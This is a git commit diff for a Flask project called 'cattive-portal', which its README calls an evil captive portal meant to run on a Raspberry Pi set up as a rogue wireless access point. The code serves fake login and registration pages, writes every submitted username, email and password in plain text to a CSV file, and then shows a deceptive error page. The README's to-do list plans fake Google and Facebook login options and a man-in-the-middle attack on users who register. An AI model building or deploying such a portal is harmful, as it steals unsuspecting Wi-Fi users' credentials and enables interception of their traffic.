936134fb8099c3e00e84187021be63926bd523bc
tomellericcardo <tomelleri.riccardo@gmail.com>
2019-11-29 22:09:05 +0100

    update readme, change error page messages

--- README.md
+++ README.md
@@ -1,2 +1,19 @@
-# cattive-portal
-An evil captive portal
+# *cattive-portal*
+An evil captive portal designed to work on a Raspberry Pi set up as an indipendent wireless AP.
+
+## How to
+Install Flask with:
+
+    pip install flask
+
+Set up the portal by editing the configuration file:
+
+    nano portal.conf
+
+Start the web-app:
+
+    python portal.py
+
+## To do
+- Add fake third party access option (such as Google and Facebook).
+- Create a real authentication system, in order to provide Internet connection to the registered user and perform a MITM attack.
--- portal.py
+++ portal.py
@@ -13,10 +13,10 @@ app = Flask(
 )
 
 # App configuration
-directory = dirname(abspath(__file__))
-config_file = join(directory, 'portal.conf')
-locale_file = join(join(directory, 'locale'), '%s.json')
-credentials = join(directory, 'credentials.csv')
+current_dir = dirname(abspath(__file__))
+config_file = join(current_dir, 'portal.conf')
+locale_file = join(join(current_dir, 'locale'), '%s.json')
+credentials = join(current_dir, 'credentials.csv')
 app.config.from_pyfile(config_file)
 
 
@@ -24,27 +24,30 @@ app.config.from_pyfile(config_file)
 def root():
     return redirect('/portal')
 
-@app.route('/login', methods = ['POST'])
-def login():
+@app.route('/authentication', methods = ['POST'])
+@app.route('/registration', methods = ['POST'])
+def authentication():
     save_credentials(request.form)
-    return redirect('/error') # Oh no! >:)
+    locale = app.config['LOCALE']
+    page_content = locale['error']
+    return render_template(
+        'error.html',
+        page = page_content,
+        path = request.path
+    )
 
 @app.route('/<page>')
 def send_page(page):
     try:
-        page_content = app.config['LOCALE'][page]
+        locale = app.config['LOCALE']
+        page_content = locale[page]
+        return render_template(
+            '%s.html' % page,
+            page = page_content
+        )
     except:
         return redirect('/portal')
-    return render_template(
-        '%s.html' % page,
-        page = page_content
-    )
 
-
-def get_locale(lang = 'en'):
-    filename = locale_file % lang
-    with open(filename) as f:
-        return json.load(f)
 
 def save_credentials(form):
     type = form.get('type')
@@ -53,21 +56,29 @@ def save_credentials(form):
     password = form.get('password')
     repeat = form.get('repeat')
     f = open(credentials, 'a')
-    f.write("%s,%s,%s,%s,%s\n" % (
-        type,
-        username,
-        email,
-        password,
-        repeat
-    ))
-    f.close()
+    with open(credentials, 'a') as f:
+        f.write("%s,%s,%s,%s,%s\n" % (
+            type,
+            username, email,
+            password, repeat
+        ))
+
+def get_locale(lang):
+    filename = locale_file % lang
+    with open(filename) as f:
+        return json.load(f)
 
 
-if __name__ == '__main__':
-    app.config['LOCALE'] = get_locale(app.config['LANG'])
+def main():
+    lang = app.config['LANG']
+    app.config['LOCALE'] = get_locale(lang)
     app.run(
         host = app.config['HOST'],
         port = app.config['PORT'],
         debug = app.config['DEBUG'],
         threaded = True
     )
+
+
+if __name__ == '__main__':
+    main()
